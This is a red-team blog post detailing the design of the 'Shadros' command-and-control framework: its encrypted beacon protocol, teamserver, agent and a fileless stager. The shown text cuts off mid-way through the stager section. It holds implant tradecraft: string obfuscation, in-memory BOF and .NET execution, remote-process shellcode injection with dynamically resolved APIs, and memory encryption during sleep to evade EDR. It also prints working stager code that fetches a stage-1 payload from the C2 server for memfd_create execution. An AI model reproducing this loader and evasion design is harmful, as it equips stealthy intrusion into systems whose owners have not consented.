---
title: "Shadros C2 — Complete Technical Deep Dive"
date: 2025-06-24
categories: [red-team]
tags: [rust, c2, malware-dev, red-team, shadros]
---
This document is a full technical walkthrough of the Shadros C2 framework.
It covers every protocol message, every cryptographic primitive,
and every execution path with diagrams at each layer.

---

## Table of Contents

1. [Common — Shared Protocol and Crypto](#1-common--shared-protocol-and-crypto)
2. [Server — Teamserver Internals](#2-server--teamserver-internals)
3. [Agent — Beacon Internals](#3-agent--beacon-internals)
4. [Stager — Fileless Stage-0 Loader](#4-stager--fileless-stage-0-loader)
5. [Client — Operator GUI](#5-client--operator-gui)
6. [End-to-End Data Flow](#6-end-to-end-data-flow)
7. [Shadros vs Modern C2 Frameworks](#7-shadros-vs-modern-c2-frameworks)

---

## 1. Common — Shared Protocol and Crypto

### 2.1 Why a Shared Crate?

The server and agent must agree on the exact byte layout of every message.
Rust's `serde` library serializes and deserializes structs to JSON automatically,
but only if both sides use the same struct definitions.
Putting those definitions in `common` guarantees that at compile time:
if the server compiles, the agent compiles, and the struct shapes match.
A mismatch is a **compile error**, not a runtime crash.

### 2.2 Key Protocol Messages

```
┌───────────────────────────────────────────────────────────────┐
│                     Wire message flow                         │
│                                                               │
│  AGENT                          SERVER                        │
│                                                               │
│  ── POST /ms/register ────────────────────────────────────►  │
│     AgentRegisterRequest                                      │
│       public_key: String (base64 X25519)                      │
│       auth_token: String (shared secret)                      │
│       listener_id: Uuid                                       │
│       sysinfo: AgentSysInfo {                                 │
│         hostname, username, os, arch, pid,                    │
│         sleep, jitter, is_elevated }                          │
│                                                               │
│  ◄── AgentRegisterResponse ──────────────────────────────────  │
│       agent_id: Uuid          (assigned by server)            │
│       server_public_key: String (base64 X25519)               │
│                                                               │
│  ── POST /ms/beacon ──────────────────────────────────────►  │
│     AgentBeaconRequest                                        │
│       agent_id: Uuid                                          │
│       encrypted: String  ◄── AES-256-GCM(AgentBeaconPayload) │
│                                                               │
│     AgentBeaconPayload (plaintext, before encrypt)            │
│       timestamp: i64                                          │
│       results: Vec<TaskResult> {                              │
│         task_id, output, error, completed_at }                │
│                                                               │
│  ◄── AgentBeaconResponse ─────────────────────────────────── │
│       encrypted: Option<String>  ◄── AES-256-GCM(TasksPayload)│
│                                                               │
│     TasksPayload (plaintext, after decrypt)                   │
│       tasks: Vec<TaskDispatch> {                              │
│         task_id, task_type, args: serde_json::Value }         │
│       kill: bool                                              │
│       new_sleep: Option<u64>                                  │
│       new_jitter: Option<f64>                                 │
└───────────────────────────────────────────────────────────────┘
```

If the server has no tasks for an agent, `AgentBeaconResponse.encrypted` is `None`
and the agent parses nothing — it just sleeps and checks in again later.

### 2.3 Cryptography — X25519 + AES-256-GCM

This is the most important part to understand correctly.
Every single byte of task data and output is encrypted.

#### Key Exchange (Registration Phase)

```
  AGENT                                      SERVER
  ──────                                     ──────
  secret_a = random 32 bytes (OsRng)
  public_A = X25519(secret_a, basepoint)

  ── POST /ms/register (public_A) ─────────────────►

                                              secret_s = random 32 bytes (OsRng)
                                              public_S = X25519(secret_s, basepoint)

                                              shared = X25519(secret_s, public_A)
                                              session_key = HKDF-SHA256(shared,
                                                info="shadros-c2-session-v1")
                                              store session_key in DashMap[agent_id]

  ◄── AgentRegisterResponse (public_S) ─────────────

  shared = X25519(secret_a, public_S)
  session_key = HKDF-SHA256(shared,
    info="shadros-c2-session-v1")
  store session_key in memory (never disk)
```

Both sides compute the same `shared` value from Diffie-Hellman.
The `HKDF-SHA256` step stretches and labels the shared secret into a 32-byte key.
The label `"shadros-c2-session-v1"` ensures that even if the same DH secret were
somehow reused in another protocol, the derived keys would be different.

**What an attacker sees on the wire:**
- The agent's ephemeral public key (32 bytes, looks random)
- The server's public key (32 bytes, looks random)
- AES-256-GCM ciphertext (looks random)

**What an attacker cannot do:**
- Reverse the X25519 shared secret from the two public keys (ECDLP hardness)
- Decrypt beacon traffic without the session key
- Replay a beacon request (AES-GCM nonce is random per message; replays fail authentication)

#### Encryption / Decryption (Beacon Phase)

```rust
// From common/src/crypto.rs

pub fn encrypt(&self, plaintext: &[u8]) -> Result<Vec<u8>> {
    let cipher = Aes256Gcm::new(Key::from_slice(&self.key));
    let nonce  = Aes256Gcm::generate_nonce(&mut OsRng);   // 12 random bytes

    let ciphertext = cipher.encrypt(&nonce, plaintext)?;   // includes GCM tag

    // Wire format: [12-byte nonce][ciphertext+tag]
    let mut result = Vec::with_capacity(12 + ciphertext.len());
    result.extend_from_slice(nonce.as_slice());
    result.extend_from_slice(&ciphertext);
    Ok(result)
}
```

The wire format is always: `nonce (12 bytes) || ciphertext || GCM authentication tag (16 bytes)`.
The GCM tag authenticates the ciphertext — any bit flip causes decryption to return an error,
not garbled plaintext. This means the server will silently drop any tampered beacon packet.

#### Memory Safety: ZeroizeOnDrop

```rust
#[derive(Zeroize, ZeroizeOnDrop)]
pub struct SessionKey {
    key: [u8; 32],
}
```

When a `SessionKey` value is dropped (goes out of scope, is removed from the DashMap),
the `ZeroizeOnDrop` derive macro calls `zeroize()` automatically — overwriting all 32
bytes of the key with zeros before freeing the memory. This prevents forensic recovery
of session keys from process memory dumps or swap files.

---

## 2. Server — Teamserver Internals

### 3.1 Shared State (AppState)

The teamserver's `AppState` is wrapped in an `Arc<AppState>` and cloned into
every Axum handler. There is no global mutable variable.
All shared mutable data uses lock-free or async-safe containers.

```
┌─────────────────────────────────────────────────────────┐
│                       AppState                          │
│                                                         │
│  db: SqlitePool              ← async SQLite pool        │
│  server_keypair: Arc<KeyPair>← server's X25519 keypair  │
│                                                         │
│  session_keys:                                          │
│    Arc<DashMap<Uuid, Arc<SessionKey>>>                  │
│    ↑ per-agent session key, inserted at /register       │
│    ↑ looked up on every /beacon                         │
│                                                         │
│  running_listeners:                                     │
│    Arc<DashMap<Uuid, CancellationToken>>                │
│    ↑ one token per active listener                      │
│    ↑ dropping / sending cancel stops the listener task  │
│                                                         │
│  stage_payloads:                                        │
│    Arc<DashMap<Uuid, Vec<u8>>>                          │
│    ↑ in-memory store of compiled stage-1 binaries       │
│    ↑ served once at /ms/stage/<uuid>                    │
│                                                         │
│  tunnel_map:                                            │
│    Arc<DashMap<Uuid, Arc<AgentTunnelEntry>>>            │
│    ↑ reverse-tunnel streams from agents                 │
│                                                         │
│  relay_map:                                             │
│    Arc<DashMap<Uuid, watch::Sender<bool>>>              │
│    ↑ cancellation for SOCKS5 relay tasks                │
│                                                         │
│  ws_tx: broadcast::Sender<WsEvent>                      │
│    ↑ fan-out to all connected GUI clients               │
│                                                         │
│  build_lock: Arc<Mutex<()>>                             │
│    ↑ serializes concurrent cargo build invocations      │
│                                                         │
│  agent_token: String   ← auth token agents must present │
│  jwt_secret:  String   ← HMAC key for operator JWTs    │
│  workspace_path: String                                 │
│  tunnel_port: u16                                       │
└─────────────────────────────────────────────────────────┘
```

### 3.2 Startup Sequence

```
main()
 │
 ├── tracing_subscriber::init()          initialize structured logging
 │
 ├── Config::parse()                     read CLI args (bind addr, DB path,
 │                                       admin creds, JWT secret, etc.)
 │
 ├── db::init_pool(cfg.database)         open SQLite connection pool
 │   └── runs migration SQL              creates tables if missing
 │
 ├── hash admin password (Argon2)        password stored only as PHC hash
 │   └── db::queries::create_operator()  INSERT OR IGNORE (idempotent)
 │
 ├── KeyPair::generate()                 ephemeral X25519 server keypair
 │   └── log server public key           useful for debugging
 │
 ├── AppState::new(...)                  allocate all shared state
 │
 ├── tokio::spawn(socks_relay::run_tunnel_acceptor(...))
 │   └── binds TCP on cfg.tunnel_port   agents connect here for SOCKS5
 │
 ├── tokio::spawn(health_check_loop)
 │   └── every 30 s: mark_agents_lost()
 │       UPDATE agents SET is_active=0
 │       WHERE last_seen < NOW() - 120 s
 │
 └── axum::serve(operator_router + agent_routes)
     └── HTTPS or HTTP depending on config
```

### 3.3 Full Route Map

```
PUBLIC (no auth)
──────────────────────────────────────────────────────
POST /auth/login              → issue JWT (Argon2 verify + HS256 sign)
GET  /server/info             → version, uptime

AGENT-FACING (token auth, no JWT)
──────────────────────────────────────────────────────
POST /ms/register             → register agent, return UUID + server pubkey
POST /ms/beacon               → encrypted check-in, return encrypted tasks
POST /ms/upload               → receive file uploaded by agent
GET  /ms/stage/<uuid>         → serve stage-1 binary (one-shot)

OPERATOR-FACING (JWT required)
──────────────────────────────────────────────────────
GET  /api/listeners           → list all listeners
POST /api/listeners           → create listener
POST /api/listeners/:id/start → start (spawn Axum sub-server)
POST /api/listeners/:id/stop  → stop (cancel token → task exits)
DEL  /api/listeners/:id       → delete

GET  /api/agents              → list all agents (with is_active)
GET  /api/agents/:id          → single agent
PUT  /api/agents/:id/settings → update sleep/jitter/note
POST /api/agents/:id/tag      → add/remove tag
POST /api/agents/:id/socks/start → start SOCKS5 relay for this agent
POST /api/agents/:id/socks/stop  → stop relay
DEL  /api/agents/:id          → delete agent + its tasks

GET  /api/tasks               → list tasks (filter by agent_id)
POST /api/tasks               → create task (status=Pending)
DEL  /api/tasks/:id           → delete

POST /api/build/agent         → compile + return stageless agent binary
POST /api/build/stager        → compile stage-0 + stage-1, store in RAM

POST /api/bof/inline-execute-assembly → queue InlineAssembly BOF task
POST /api/bof/execute                 → queue ExecuteBof task

GET  /api/credentials         → credential vault
POST /api/credentials
DEL  /api/credentials/:id

GET  /api/targets
POST /api/targets
DEL  /api/targets/:id

GET  /api/ws                  → WebSocket upgrade (real-time events to GUI)
```

### 3.4 Agent Registration Handler (Deep)

```
POST /ms/register
 │
 ├── verify body.auth_token == state.agent_token
 │   └── reject 401 if mismatch
 │
 ├── parse body.sysinfo → AgentSysInfo
 │
 ├── look up listener by body.listener_id
 │   └── needed to determine agent's entry point
 │
 ├── server_keypair.derive_session_key(body.public_key)
 │   └── X25519(server_secret, agent_public) → HKDF → SessionKey
 │
 ├── agent_id = Uuid::new_v4()
 │
 ├── db::queries::create_agent(pool, agent_id, sysinfo, listener_id, ip)
 │   └── INSERT INTO agents ...
 │
 ├── state.session_keys.insert(agent_id, Arc::new(session_key))
 │
 ├── state.broadcast(WsEvent::AgentConnected { agent_id })
 │   └── all connected GUI clients receive the new agent instantly
 │
 └── return AgentRegisterResponse {
         agent_id,
         server_public_key: server_keypair.public_b64()
     }
```

### 3.5 Beacon Handler (Deep)

This is the hottest path in the server — called every sleep interval by every agent.

```
POST /ms/beacon
 │
 ├── parse AgentBeaconRequest { agent_id, encrypted }
 │
 ├── look up session_key = state.session_keys.get(agent_id)
 │   └── 401 if not found (agent not registered)
 │
 ├── decrypt: session_key.decrypt_b64(encrypted)
 │   └── AES-256-GCM authenticate + decrypt
 │   └── if auth tag fails → 400 (drop silently in prod)
 │
 ├── deserialize AgentBeaconPayload { timestamp, results }
 │
 ├── for each TaskResult in results:
 │   ├── db::queries::update_task(task_id, output, error, Completed)
 │   └── state.broadcast(WsEvent::TaskCompleted { task_id, output })
 │
 ├── db::queries::update_agent_last_seen(agent_id, now, client_ip)
 │
 ├── db::queries::get_pending_tasks(agent_id)
 │   └── SELECT * FROM tasks WHERE agent_id=? AND status='Pending'
 │
 ├── if no pending tasks:
 │   └── return AgentBeaconResponse { encrypted: None }
 │
 ├── for each task: UPDATE status → 'Sent'
 │
 ├── build TasksPayload { tasks, kill: false, new_sleep, new_jitter }
 │
 ├── serialize → JSON bytes
 │
 ├── session_key.encrypt_b64(bytes)
 │   └── fresh random nonce per response
 │
 └── return AgentBeaconResponse { encrypted: Some(ciphertext_b64) }
```

### 3.6 SQLite Schema

```sql
-- Operators (C2 users / red team members)
CREATE TABLE operators (
    id            TEXT PRIMARY KEY,
    username      TEXT UNIQUE NOT NULL,
    password_hash TEXT NOT NULL,    -- Argon2id PHC string
    created_at    TEXT NOT NULL
);

-- Beacons / implants
CREATE TABLE agents (
    id            TEXT PRIMARY KEY,  -- UUID
    hostname      TEXT NOT NULL,
    username      TEXT NOT NULL,
    os            TEXT NOT NULL,
    arch          TEXT NOT NULL,
    pid           INTEGER NOT NULL,
    ip            TEXT NOT NULL,
    listener_id   TEXT NOT NULL,
    sleep         INTEGER NOT NULL DEFAULT 5,
    jitter        REAL    NOT NULL DEFAULT 0.2,
    kill_date     TEXT,             -- ISO-8601 or NULL
    working_hours TEXT,
    last_seen     TEXT NOT NULL,
    created_at    TEXT NOT NULL,
    is_active     INTEGER NOT NULL DEFAULT 1,
    note          TEXT,
    tags          TEXT NOT NULL DEFAULT '[]',  -- JSON array
    is_elevated   INTEGER NOT NULL DEFAULT 0
);

-- Listener definitions
CREATE TABLE listeners (
    id            TEXT PRIMARY KEY,
    name          TEXT NOT NULL,
    listener_type TEXT NOT NULL,    -- 'http' | 'https' | 'smb' | 'dns'
    host          TEXT NOT NULL,
    port          INTEGER NOT NULL,
    is_active     INTEGER NOT NULL DEFAULT 0,
    config        TEXT NOT NULL DEFAULT '{}',  -- JSON
    created_at    TEXT NOT NULL
);

-- Task queue
CREATE TABLE tasks (
    id            TEXT PRIMARY KEY,
    agent_id      TEXT NOT NULL,
    task_type     TEXT NOT NULL,    -- 'shell' | 'list_files' | 'inject' | ...
    args          TEXT NOT NULL,    -- JSON args
    status        TEXT NOT NULL,    -- Pending | Sent | Running | Completed | Failed
    output        TEXT,
    error         TEXT,
    operator      TEXT NOT NULL,
    created_at    TEXT NOT NULL,
    completed_at  TEXT
);

-- Credential vault
CREATE TABLE credentials (
    id         TEXT PRIMARY KEY,
    username   TEXT NOT NULL,
    secret     TEXT NOT NULL,
    cred_type  TEXT NOT NULL,   -- 'password' | 'hash' | 'certificate' | 'token'
    domain     TEXT,
    source     TEXT,
    agent_id   TEXT,
    created_at TEXT NOT NULL
);

-- Target notes
CREATE TABLE targets (
    id         TEXT PRIMARY KEY,
    ip         TEXT NOT NULL,
    hostname   TEXT,
    os         TEXT,
    notes      TEXT,
    tags       TEXT NOT NULL DEFAULT '[]',
    created_at TEXT NOT NULL
);
```

### 3.7 Dynamic Listeners

A **Listener** is a separate Axum server that binds to its own port.
It runs as a Tokio task with a `CancellationToken`.

```
Operator: POST /api/listeners/:id/start
  │
  ├── fetch listener from DB
  ├── create CancellationToken
  ├── state.running_listeners.insert(id, token.clone())
  └── tokio::spawn(http_listener::run(state, listener, token))
           │
           └── Axum sub-router bound to listener.host:listener.port
               handling /ms/register, /ms/beacon, /ms/upload, /ms/stage/*
               sharing the same AppState as the main server

Operator: POST /api/listeners/:id/stop
  │
  └── state.running_listeners.remove(id) → drops CancellationToken
      └── the spawned task receives cancellation → listener exits
```

Multiple listeners can run simultaneously on different ports.
Each listener uses the same agent handler code — the agent's `listener_id`
field in the registration request tells the server which entry point was used.

### 3.8 WebSocket Real-Time Updates

Instead of polling, the GUI subscribes to a WebSocket at `/api/ws`.

```
tokio::broadcast::channel(1024)
       │
       ├── ws_tx: Sender<WsEvent>     (in AppState)
       │          called by every handler that changes state:
       │          AgentConnected, AgentLost, TaskCompleted, etc.
       │
       └── ws_rx: Receiver<WsEvent>   (one per WebSocket connection)
                  each GUI client gets its own receiver
                  events are JSON-serialized and sent over the socket
```

### 3.9 Build Pipeline

When the operator clicks "Build" in the GUI, the server runs `cargo build`
as a subprocess and returns the compiled binary to the client.

```
POST /api/build/agent
 │
 ├── acquire build_lock (Mutex) — only one build at a time
 │
 ├── rustup target add <target>   ensure cross-compiler is installed
 │
 ├── cargo build --bin svc --target <target> --release
 │     env SHADROS_SERVER_URL  = body.server_url
 │     env SHADROS_AUTH_TOKEN  = state.agent_token
 │     env SHADROS_LISTENER_ID = body.listener_id
 │     env SHADROS_SLEEP       = body.sleep
 │     env SHADROS_JITTER      = body.jitter
 │     env SHADROS_USER_AGENT  = body.user_agent
 │
 │   ↑ These envs are read by agent/src/config.rs
 │     and baked into the binary as compile-time constants
 │
 ├── read the output ELF/PE from target/<target>/release/svc
 │
 ├── base64-encode the bytes
 │
 └── return BuildAgentResponse { filename, size, data: b64 }

POST /api/build/stager
 │
 ├── acquire build_lock
 │
 ├── stage_uuid = Uuid::new_v4()
 │
 ├── build stage-1 agent (same as above)
 │   └── store bytes in state.stage_payloads[stage_uuid]
 │
 ├── build stage-0 stager
 │     env SHADROS_STAGE_URL = "http://<server>:<port>/ms/stage/<stage_uuid>"
 │
 └── return BuildStagerResponse {
         stager_filename, stager_size, stager_data: b64,
         stage_url
     }
```

### 3.10 SOCKS5 Reverse Tunnel Architecture

The SOCKS5 relay is the most complex subsystem in Shadros.
It allows an operator to proxy arbitrary TCP connections through an agent
without the agent ever initiating an outbound connection to the operator's machine.

```
OPERATOR MACHINE                  SERVER                   TARGET NETWORK
─────────────────                 ──────                   ──────────────

curl --socks5 127.0.0.1:1080      SOCKS5 relay             agent
  http://192.168.1.50/admin        on 127.0.0.1:1080
       │                                │                        │
       │  TCP connect :1080             │                        │
       └──────────────────────────────► │                        │
                                        │                        │
                                        │  [reverse tunnel]      │
                                        │ ◄──────────────────────┘
                                        │  (agent connected to
                                        │   server:tunnel_port at
                                        │   agent start_socks time)
                                        │
                      ┌─────────────────┴──────────────────────┐
                      │  SOCKS5 handshake (RFC 1928)           │
                      │  → determine target: 192.168.1.50:80   │
                      │                                        │
                      │  pair: operator socket ↔ tunnel stream │
                      │  (agent dials 192.168.1.50:80          │
                      │   and bridges the two streams)         │
                      └────────────────────────────────────────┘

State on server:
  TunnelMap[agent_id] = VecDeque<TcpStream>  ← pool of agent connections
  RelayMap[agent_id]  = watch::Sender<bool>  ← cancel channel

When operator connects to SOCKS5 port:
  1. server pops a TcpStream from TunnelMap[agent_id]
  2. SOCKS5 negotiation happens on the operator side
  3. CONNECT request (target IP:port) is sent down the tunnel stream
  4. agent reads CONNECT, dials target, starts bidirectional copy
```

---

## 3. Agent — Beacon Internals

### 4.1 Compile-Time Configuration

Unlike many C2 agents that store configuration in a struct or config file on disk,
Shadros bakes the entire configuration into the binary at compile time using
Rust's `option_env!()` macro.

```rust
// agent/src/config.rs
const DEFAULT_URL: &str = match option_env!("SHADROS_SERVER_URL") {
    Some(v) => v,
    None    => "http://127.0.0.1:4444",
};
```

`option_env!()` reads the environment variable **at compile time**, not at runtime.
When the server builds the agent binary, it sets these env vars:

```
SHADROS_SERVER_URL   → baked in as a string literal in the binary
SHADROS_AUTH_TOKEN   → baked in (but also XOR-obfuscated — see 4.2)
SHADROS_LISTENER_ID  → baked in
SHADROS_SLEEP        → baked in (e.g. "30" for 30-second sleep)
SHADROS_JITTER       → baked in (e.g. "0.3" for ±30% jitter)
SHADROS_USER_AGENT   → baked in HTTP User-Agent string
```

The agent still accepts runtime overrides via CLI args or environment variables,
but when deployed without arguments the baked defaults are used.

### 4.2 String Obfuscation

The route paths `/ms/register` and `/ms/beacon` would be trivially visible with
`strings binary` if stored as plain literals. Shadros solves this with a
`build.rs` script that generates XOR-obfuscated versions of all sensitive strings.

```
build.rs (runs at compile time)
 │
 ├── generates src/OUT_DIR/obf_strings.rs
 │     pub const PATH_REG: &[u8] = &[0x7e, 0x12, ...];  ← XOR'd bytes
 │     pub const PATH_BCN: &[u8] = &[0x7e, 0x2a, ...];
 │     pub const DEF_TOKEN: &[u8] = &[...];
 │
 └── obf.rs: include!(concat!(env!("OUT_DIR"), "/obf_strings.rs"));
             pub fn d(data: &[u8]) -> String { /* XOR decode */ }
```

At runtime, `obf::d(obf::PATH_REG)` decodes the path just before the HTTP request is built.
The decoded string lives in a stack-allocated `String` for the duration of the call,
then is dropped and zeroed. A basic string search of the binary finds only garbage bytes.

### 4.3 Registration and Session Key Derivation

```
run_agent()
 │
 ├── collect_sysinfo()
 │   ├── Linux: read /etc/hostname, $USER, /proc/self/status
 │   ├── Windows: GetComputerNameA, GetUserNameA (token-aware!)
 │   └── check_elevated():
 │       Linux: geteuid() == 0
 │       Windows: GetTokenInformation(TokenElevation)
 │                ↑ reflects impersonation correctly
 │
 ├── KeyPair::generate()
 │   └── StaticSecret::random_from_rng(OsRng)   true random, not PRNG
 │
 ├── build AgentRegisterRequest
 │
 ├── retry loop (exponential back-off: 5s → 10s → 20s → ... → 60s max)
 │   └── POST /ms/register until success
 │       ↑ agent never exits because server isn't up yet
 │
 ├── parse AgentRegisterResponse
 │
 ├── keypair.derive_session_key(resp.server_public_key)
 │   ├── B64.decode(server_public_key) → [u8; 32]
 │   ├── PublicKey::from(bytes) → X25519 point
 │   ├── secret.diffie_hellman(&server_pub) → SharedSecret (32 bytes)
 │   └── HKDF-SHA256(shared, info="shadros-c2-session-v1") → [u8; 32]
 │
 └── enter beacon loop
```

### 4.4 Beacon Loop — Full State Machine

```
loop {
    ┌─────────────────────────────────────────────────────┐
    │                   KILL DATE CHECK                   │
    │  if Utc::now() >= cfg.kill_date { break; }          │
    │  (kill_date is a compile-time baked timestamp)      │
    └──────────────────────────┬──────────────────────────┘
                               │
    ┌──────────────────────────▼──────────────────────────┐
    │                  BUILD PAYLOAD                      │
    │  AgentBeaconPayload {                               │
    │    timestamp: Utc::now().timestamp(),               │
    │    results: mem::take(&mut pending_results)         │
    │    ↑ drains the result buffer, sends all at once    │
    │  }                                                  │
    └──────────────────────────┬──────────────────────────┘
                               │
    ┌──────────────────────────▼──────────────────────────┐
    │             ENCRYPT AND SEND (beacon_once)          │
    │  1. serialize payload → JSON bytes                  │
    │  2. session_key.encrypt_b64(bytes)                  │
    │     → [12-byte nonce || AES-GCM ciphertext]         │
    │  3. POST /ms/beacon { agent_id, encrypted }         │
    └──────────────────────────┬──────────────────────────┘
                               │
              ┌────────────────┴────────────────┐
              │ response.encrypted == None?     │
              │                                 │
         YES  │                           NO    │
              ▼                                 ▼
        sleep, loop                   decrypt response
                                      → TasksPayload

    ┌──────────────────────────────────────────────────────┐
    │              HANDLE CONTROL MESSAGES                 │
    │  if tasks_payload.kill → break loop → process exits  │
    │  if tasks_payload.new_sleep → update sleep_secs      │
    │  if tasks_payload.new_jitter → update jitter         │
    └──────────────────────────┬───────────────────────────┘
                               │
    ┌──────────────────────────▼───────────────────────────┐
    │               DISPATCH TASKS (CONCURRENT)            │
    │                                                      │
    │  let handles: Vec<JoinHandle> = tasks               │
    │    .into_iter()                                      │
    │    .map(|t| tokio::spawn(execute_task(t)))           │
    │    .collect();                                       │
    │                                                      │
    │  for h in handles { results.push(h.await?) }         │
    │                                                      │
    │  ↑ ALL tasks run in parallel on Tokio's thread pool  │
    │  ↑ A blocking BOF runs on spawn_blocking() thread   │
    │  ↑ The beacon loop itself is never blocked           │
    └──────────────────────────┬───────────────────────────┘
                               │
    ┌──────────────────────────▼───────────────────────────┐
    │                 JITTER SLEEP                         │
    │                                                      │
    │  spread = sleep_secs * jitter * 1000  (milliseconds) │
    │  jitter_ms = rng.gen_range(-spread..=spread)         │
    │  actual_ms = (sleep_secs * 1000 + jitter_ms).max(500)│
    │                                                      │
    │  Example: sleep=30, jitter=0.3                       │
    │    spread = 9000 ms                                  │
    │    actual sleep = 21s to 39s (uniformly random)      │
    └──────────────────────────────────────────────────────┘
}
```

### 4.5 Shell Task — Built-in Commands vs Child Process

This is a key OPSEC design decision. Creating a `cmd.exe` or `/bin/sh` child process
generates process-creation telemetry (Windows: Event ID 4688, EDR hooks,
Linux: execve audit events). Shadros avoids this for common operations.

```
execute("whoami")
  │
  └── match verb "whoami" → builtin_whoami()
        Linux: read $USER / $LOGNAME env var (no process creation)
        Windows: win::whoami() → direct Win32 API call

execute("ls /tmp")
  │
  └── match verb "ls" → builtin_ls("/tmp")
        calls std::fs::read_dir() directly
        returns formatted output as a String
        → NO /bin/ls process, NO shell, NO execve syscall

execute("cat /etc/passwd")
  │
  └── match verb "cat" → builtin_cat("/etc/passwd")
        calls std::fs::read_to_string()
        → NO child process

execute("curl http://...")          ← unknown verb
  │
  └── spawn_hidden("curl http://...")
        Linux: std::process::Command::new("sh").arg("-c").arg(cmd)
        Windows: std::process::Command::new("cmd").arg("/C").arg(cmd)
                 .creation_flags(CREATE_NO_WINDOW)
                 ↑ no visible window, no console
```

Built-in commands: `whoami`, `hostname`, `pwd/cwd`, `cd`, `ls/dir`,
`cat/type`, `env/set`, `mkdir/md`, `rm/del/rmdir`, `mv/move/ren`, `cp/copy`.

Anything else falls through to `spawn_hidden()` which does create a child process,
but with no visible window and no inherited console handles.

### 4.6 BOF (Beacon Object File) Execution

BOFs are small position-independent COFF object files that run inside the agent's
process space. Shadros implements the same BOF API as Cobalt Strike's beacon.h —
any public BOF written for CS runs on Shadros.

```
execute_bof task arrives
 │
 ├── decode bof_b64 → raw COFF bytes
 ├── decode args_b64 → packed argument buffer
 │
 ├── tokio::task::spawn_blocking(|| {
 │     exec::run_bof(coff_bytes, args_bytes, async_mode)
 │   })
 │   ↑ blocks a thread pool thread, not the async executor
 │
 │   run_bof:
 │   ├── parse COFF header → find .text, .data, .bss sections
 │   ├── allocate RW memory (VirtualAlloc on Win, mmap on Linux)
 │   ├── copy sections, apply relocations
 │   ├── resolve external symbols:
 │   │     BeaconPrintf, BeaconOutput, BeaconDataParse,
 │   │     BeaconDataExtract, BeaconDataInt, BeaconDataLength,
 │   │     BeaconFormatAlloc, BeaconFormatAppend, ...
 │   │     LoadLibraryA, GetProcAddress (Windows)
 │   ├── flip section to RX (no permanent RWX mapping)
 │   ├── call go() function entry point
 │   └── collect captured BeaconOutput → return String
```

### 4.7 Inline .NET Assembly Execution

The `inline_assembly` task loads a .NET assembly into the agent's process
without writing it to disk. This uses Extension-Kit's execute-assembly BOF
which hosts the CLR in-process.

```
inline_execute_assembly task
 │
 ├── base64-decode the .NET PE bytes  (assembly)
 ├── base64-decode the module BOF bytes (Extension-Kit execute-assembly.x64.o)
 │
 ├── pack_args():
 │   ┌──────────────────────────────────────────┐
 │   │ Wire format for BOF argument buffer:     │
 │   │                                          │
 │   │  [u32-LE: assembly_len][assembly_bytes]  │
 │   │  [u32-LE: args_str_len][args_string\0]   │
 │   │                                          │
 │   │  Extension-Kit reads these with          │
 │   │  BeaconDataExtract() in sequence.        │
 │   └──────────────────────────────────────────┘
 │
 └── exec::run_mod(mod_bytes, packed_args)
       ↑ loads the execute-assembly BOF as a COFF
         the BOF internally:
         1. creates a COM-based CLR host
         2. loads the .NET assembly from memory (no disk I/O)
         3. calls the entry point with the argument string
         4. captures Console.WriteLine output via pipe
         5. passes output back through BeaconOutput
```

### 4.8 Process Injection (Windows)

```
inject_shellcode(pid, shellcode_bytes)
 │
 ├── OpenProcess(PROCESS_ALL_ACCESS, pid)
 │   → handle to the target process
 │
 ├── GetProcAddress(kernel32, "VirtualAllocEx")
 │   ↑ dynamic resolution — import table doesn't list VirtualAllocEx
 │   ↑ defeats naive import-table scans
 │
 ├── VirtualAllocEx(h_proc, size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
 │   → allocate RW buffer in target
 │
 ├── WriteProcessMemory(h_proc, base, shellcode, size)
 │   → copy shellcode bytes into the buffer
 │
 ├── VirtualProtectEx(h_proc, base, size, PAGE_EXECUTE_READ, &old)
 │   → flip permissions to RX (never RWX permanently)
 │
 ├── GetProcAddress(ntdll, "RtlCreateUserThread")
 │   → preferred over CreateRemoteThread (less-hooked by EDR)
 │
 └── RtlCreateUserThread(h_proc, base)
     → create a new thread in the target process
       that executes from base
     → shellcode runs
```

All Win32 API functions are resolved dynamically through `GetModuleHandleA` +
`GetProcAddress`. The agent's import table contains none of the commonly
flagged injection APIs (`VirtualAllocEx`, `WriteProcessMemory`, etc.).

### 4.9 Shadow Sleep (Optional Windows Evasion)

When compiled with `SHADROS_SHADOW_SLEEP=1`, the Tokio sleep call is replaced
with a custom C function (`shadow_sleep.c`) that encrypts the agent's own memory
during sleep.

```
Normal sleep:
  agent heap + stack + .text in memory (plaintext)
  EDR memory scanner runs: finds beacon pattern → ALERT

Shadow Sleep:
  1. enumerate agent's own memory regions (VirtualQuery loop)
  2. encrypt all RW regions with a random key (XOR or AES)
  3. Sleep(ms)   ← agent is dormant; memory is ciphertext
  4. decrypt all regions with the same key
  5. return (agent resumes)

  EDR memory scanner during sleep: finds only ciphertext → no match
```

---

## 4. Stager — Fileless Stage-0 Loader

### 5.1 Design Goals

The stager has three hard constraints:
1. **Zero external crates** — no cargo dependencies, smallest possible binary
2. **No disk writes on Linux** — the stage-1 binary must never touch the filesystem
3. **HTTP without a TLS library** — connects to the server over plain HTTP to avoid linking OpenSSL

The entire stager is ~100 lines of Rust.
The compiled binary is under 10 KB stripped.

### 5.2 HTTP Fetch Without reqwest

```rust
fn fetch() -> Option<Vec<u8>> {
    // Parse http://host:port/path manually (no url crate)
    let rest      = STAGE_URL.strip_prefix("http://").unwrap_or(STAGE_URL);
    let (hp, path) = rest.split_once('/').unwrap_or((rest, ""));
    let (host, ps) = hp.split_once(':').unwrap_or((hp, "80"));
    let port: u16  = ps.parse().unwrap_or(80);

    // Raw TCP socket (no tokio, no reqwest, no hyper)
    let mut stream = TcpStream::connect((host, port)).ok()?;

    // Hand-written HTTP/1.1 GET
    stream.write_all(format!(
        "GET /{path} HTTP/1.1\r\nHost: {hp}\r\nConnection: close\r\n\r\n"
    ).as_bytes()).ok()?;

    // Read entire response
    let mut resp = Vec::new();
    stream.read_to_end(&mut resp).ok()?;

    // Reject non-200
    if !resp.starts_with(b"HTTP/1.1 200") { return None; }

    // Find \r\n\r\n header terminator
    let body = resp.windows(4).position(|w| w == b"\r\n\r\n")? + 4;
    Some(resp[body..].to_vec())
}
```

There is no HTTP parsing library. The stager sends exactly one request,
reads until connection close, skips the headers, and returns the body.

### 5.3 Linux Fileless Execution (memfd_create)

This is the most technically interesting part of Shadros.

```
                    Linux kernel
                         │
                         │  SYS_memfd_create(".", 0)
                         │  returns fd = 7  (for example)
                         │
                         │  This fd has NO path in any filesystem.
                         │  It is only accessible via /proc/self/fd/7
                         │
agent stager             │                    kernel VFS
─────────────            │                    ──────────
write_all(&bytes, fd=7)  │
